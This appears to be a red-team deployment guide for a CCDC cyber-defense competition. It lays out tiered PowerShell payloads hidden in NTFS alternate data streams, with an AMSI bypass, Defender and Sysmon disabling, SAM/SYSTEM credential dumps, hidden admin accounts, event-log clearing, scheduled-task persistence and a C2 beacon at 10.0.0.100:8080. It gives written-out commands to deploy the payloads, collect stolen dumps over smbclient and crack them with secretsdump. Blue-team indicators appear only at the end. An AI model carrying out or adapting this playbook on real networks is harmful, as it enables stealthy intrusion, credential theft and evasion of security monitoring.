# Competition Deployment Guide - CCDC 2026

## Attack Infrastructure

- **Attack Box:** 10.0.0.100:8080 (HTTP server)
- **Targets:** 2 DCs, 4-6 Windows servers, 2-4 workstations
- **Blue Team Defenses:** Sysmon + Windows Defender
- **AMSI Bypass:** Built into ADS-OneLiner.ps1 (XOR Fragment Splitting)

## Payload Files

All payloads have been pre-configured with attack box IP `10.0.0.100:8080`.

### Domain Controllers (Tier 1 - Maximum Stealth)

**Primary:** `competition/payloads/dc-primary.ps1`
- Defense evasion (disable logging, Defender exclusions, tamper protection workaround)
- Credential dump (SAM + SYSTEM + SECURITY with timestomping)
- C2 beacon download cradle
- Stealthy firewall manipulation (allow-all rule, firewall stays "on")
- Sysmon disable + driver unload

**Secondary:** `competition/payloads/dc-secondary.ps1`
- Domain enumeration (DCs, domain admins, forest info)
- Full system recon + scheduled task enumeration
- Hidden admin creation (svcUpdate - hidden from login screen)
- Lateral movement prep (WinRM, PSRemoting, WMI access)
- RDP enablement with NLA disabled

**Deployment Command:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile competition/payloads/dc-primary.ps1 \
  -Encrypt -Randomize -ZeroWidthStreams \
  -UseDeepPlacement -AttachToExisting \
  -CreateDecoys 3 -InstanceCount 3 \
  -OutputFile competition/dc-primary-deploy.txt
```

### Windows Servers (Tier 2 - Medium Stealth)

**Primary:** `competition/payloads/server-primary.ps1`
- Aggressive firewall disable (netsh + service disable)
- Dual C2 beacons (download cradle + polling beacon with 5-min interval)
- Service disruption (Defender, Windows Update, Sysmon)
- Defense evasion (PowerShell logging disable)

**Secondary:** `competition/payloads/server-secondary.ps1`
- RDP enablement + port opening (3389, 5985, 5986, 445)
- Dual admin creation (svcAdmin + built-in Administrator re-enable)
- Lateral movement prep (WinRM, SMB share staging)
- Recon + credential dump

**Deployment Command:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile competition/payloads/server-primary.ps1 \
  -Encrypt -Randomize -InstanceCount 2 \
  -OutputFile competition/server-primary-deploy.txt
```

### Workstations (Tier 3 - Rapid Deployment)

**Primary:** `competition/payloads/workstation-primary.ps1`
- C2 beacon download cradle
- Fast firewall disable
- Credential dump (SAM + SYSTEM)
- Defense evasion (Defender exclusions, PowerShell logging)
- Sysmon disable
- Quick recon

**Secondary:** `competition/payloads/workstation-secondary.ps1`
- Full recon + interesting file search
- Admin creation
- RDP enablement
- Event log clearing (noisy but effective)
- User data compression for exfil

**Deployment Command:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile competition/payloads/workstation-primary.ps1 \
  -Encrypt -Randomize \
  -OutputFile competition/workstation-primary-deploy.txt
```

## Deployment Tiers

### Tier 1: Full Stealth (Domain Controllers)

**Features:**
- AES-256 encryption with hardware-derived keys
- Zero-width Unicode stream names
- Deep placement in WER/Cache directories
- Attach to existing files when possible
- 3 decoy streams per instance
- 3 independent instances per DC
- JScript wrapper for Task Scheduler (invisible execution)

**Estimated Detection:** Very Low
**Deployment Time:** 15-30 seconds per target
**Persistence:** Scheduled tasks (SYSTEM context, dual triggers: startup + 5-min polling)

### Tier 2: Medium Stealth (Windows Servers)

**Features:**
- AES-256 encryption
- Randomized stream names
- 2 independent instances per server
- JScript wrapper for Task Scheduler

**Estimated Detection:** Low-Medium
**Deployment Time:** 8-15 seconds per target
**Persistence:** Scheduled tasks (SYSTEM context)

### Tier 3: Rapid Deployment (Workstations)

**Features:**
- AES-256 encryption
- Randomized stream names
- Single instance deployment
- JScript wrapper for Task Scheduler

**Estimated Detection:** Medium
**Deployment Time:** 5-8 seconds per target
**Persistence:** Scheduled tasks (SYSTEM context)

### Tier 4: Fallback (Maximum Speed - NOT RECOMMENDED)

**Features:**
- No encryption
- No randomization
- Plaintext payload in ADS

**Estimated Detection:** High
**Deployment Time:** 2-3 seconds per target
**Use Case:** Emergency re-compromise or low-value targets only

**Deployment Command:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile competition/payloads/workstation-primary.ps1 \
  -OutputFile competition/fallback-deploy.txt
```

## Payload Selection Matrix

### By Objective

| Objective | Recommended Payloads | Notes |
|-----------|---------------------|-------|
| **Initial Access** | dc-primary.ps1 or server-primary.ps1 | Disables defenses first |
| **Persistence** | All primary payloads | Scheduled tasks via ADS |
| **Credential Access** | dc-primary.ps1, server-secondary.ps1, workstation-primary.ps1 | SAM/SYSTEM dumps |
| **Lateral Movement** | dc-secondary.ps1, server-secondary.ps1 | WinRM, PSRemoting, SMB shares |
| **Recon** | All secondary payloads | Network, domain, file enumeration |
| **Impact** | workstation-secondary.ps1 | Event log clearing, data exfil |

### By Stealth vs Reliability

| Approach | Primary Choice | Secondary Choice | Tradeoff |
|----------|---------------|------------------|----------|
| **Maximum Stealth** | dc-primary.ps1 | dc-secondary.ps1 | Slower, subtle techniques |
| **Balanced** | server-primary.ps1 | server-secondary.ps1 | Moderate speed + stealth |
| **Maximum Speed** | workstation-primary.ps1 | workstation-secondary.ps1 | Fast but noisier |

### By Target Value

| Target Tier | Approach | Payloads | Deployment Flags |
|-------------|----------|----------|------------------|
| **Tier 1 (DCs)** | Full COMBO | dc-primary + dc-secondary | `-Encrypt -Randomize -ZeroWidthStreams -UseDeepPlacement -AttachToExisting -CreateDecoys 3 -InstanceCount 3` |
| **Tier 2 (Servers)** | Targeted | server-primary + server-secondary | `-Encrypt -Randomize -InstanceCount 2` |
| **Tier 3 (Workstations)** | Minimal | workstation-primary OR workstation-secondary | `-Encrypt -Randomize` |

## Pre-Deployment Checklist

- [ ] HTTP server running on 10.0.0.100:8080 with `agent.ps1` and `/tasks` endpoint
- [ ] All payload files reviewed and IP addresses confirmed (10.0.0.100)
- [ ] Deployment scripts generated for each target tier
- [ ] Manifests saved for cleanup reference
- [ ] Responder ready for NTLM hash capture (if using CRED-005)
- [ ] Secretsdump.py ready for offline hash cracking
- [ ] Backup exfil method prepared (SMB share, HTTP POST listener, etc.)

## Post-Deployment Actions

### Verify Persistence
```powershell
# Check scheduled task
Get-ScheduledTask | Where-Object { $_.TaskName -like 'WinSAT_*' }

# Check ADS presence (requires manifest codepoints)
$sn='<from manifest>'
Test-Path "C:\ProgramData\<file>:$sn"
```

### Collect Artifacts
```bash
# Download credential dumps from target
smbclient //10.0.0.50/C$ -U svcAdmin%'Pa$$w0rd2026!' \
  -c 'cd ProgramData; get s.dat; get sy.dat; get se.dat'

# Crack hashes offline
secretsdump.py -sam s.dat -system sy.dat -security se.dat LOCAL

# Download recon files
smbclient //10.0.0.50/C$ -U svcAdmin%'Pa$$w0rd2026!' \
  -c 'cd ProgramData; get r.txt; get d.txt; get t.txt; get f.txt'
```

### Cleanup (End of Competition)

Each deployment generates a manifest with exact stream names (including zero-width codepoints). Use the cleanup section from the deployment output file.

**Generic cleanup template:**
```powershell
# Reconstruct stream name from manifest
$sn=<stream_name_escaped_from_manifest>

# Remove ADS
Remove-Item "$hp`:$sn" -Force

# Remove scheduled task
Unregister-ScheduledTask -TaskName 'WinSAT_*' -Confirm:$false

# Remove JScript wrapper
$_jsDir = Split-Path $hp -Parent
Get-ChildItem -Path $_jsDir -Filter "windiag_*.js" -EA 0 | Remove-Item -Force

# Remove host file (if not attached to existing)
Remove-Item $hp -Force

# Remove staged artifacts
Remove-Item C:\ProgramData\*.dat -Force
Remove-Item C:\ProgramData\*.txt -Force
Remove-Item C:\ProgramData\backup.zip -Force
```

## Troubleshooting

### Payload Won't Execute
- Check AMSI bypass is enabled (default ON in ADS-OneLiner.ps1)
- Verify Defender real-time protection status
- Check PowerShell execution policy: `Get-ExecutionPolicy`
- Try Tier 4 fallback deployment (unencrypted, faster)

### C2 Beacon Not Calling Home
- Verify HTTP server is running: `curl http://10.0.0.100:8080/agent.ps1`
- Check firewall rules on attack box: `sudo ufw status`
- Verify network connectivity from target: `Test-NetConnection 10.0.0.100 -Port 8080`
- Check scheduled task is running: `Get-ScheduledTask -TaskName 'WinSAT_*' | Get-ScheduledTaskInfo`

### Scheduled Task Fails to Create
- Verify PowerShell version: `$PSVersionTable.PSVersion` (requires 5.1+)
- Check SYSTEM privileges: `whoami` should show `nt authority\system`
- Review task scheduler logs: `Get-WinEvent -LogName Microsoft-Windows-TaskScheduler/Operational -MaxEvents 20`

### ADS Not Found After Deployment
- Verify stream name reconstruction (use manifest codepoints for zero-width)
- Check host file exists: `Test-Path $hp`
- List all streams: `Get-Item $hp -Stream *`
- Deep placement may have chosen different directory - check manifest

## Operational Security Notes

### Avoid These Mistakes
1. **Don't use SYSTEM-context-incompatible payloads** from scheduled tasks:
   - FUN-001 through FUN-006 (wallpaper, TTS, notepad, mouse swap, screen rotate, beep)
   - CRED-003 (Chrome cookies - SYSTEM has no user Chrome profile)
   - NOVEL-002, NOVEL-004 (HKCU-based persistence - writes to SYSTEM hive)

2. **Don't forget to start HTTP server** before deploying C2 beacons

3. **Don't lose manifests** - zero-width stream names require codepoint reconstruction

4. **Don't mix encrypted/unencrypted** in same cleanup - check manifest first

### Blue Team Detection Indicators
- Scheduled tasks with random names (`WinSAT_XXXXXX`)
- JScript files in ProgramData/WER/Cache directories (`windiag_*.js`)
- Registry modifications to Defender/PowerShell logging policies
- Service stop events for Sysmon/Defender
- Outbound HTTP connections to 10.0.0.100:8080
- Credential dump artifacts (s.dat, sy.dat, se.dat) in C:\ProgramData

### Recommended Countermeasures for Blue Team Training
(For post-competition analysis and defensive improvement)

1. Monitor scheduled task creation via Sysmon Event ID 4698
2. Alert on service stop/disable for Sysmon, Defender, WinDefend
3. File integrity monitoring for HKLM policy registry keys
4. Network monitoring for outbound HTTP to non-standard ports
5. PowerShell script block logging (even when policy tries to disable it)
6. Alternate Data Stream enumeration on all executable paths
7. JScript/VBScript execution logging via Process Creation (Event ID 4688)

---

**Remember:** This is an authorized red team exercise for CCDC competition. All payloads must only be deployed against competition infrastructure. See `docs/PROJECT-AUTHORIZATION.md` and `docs/SAFETY-BOUNDARIES.md` for full ethical framework.
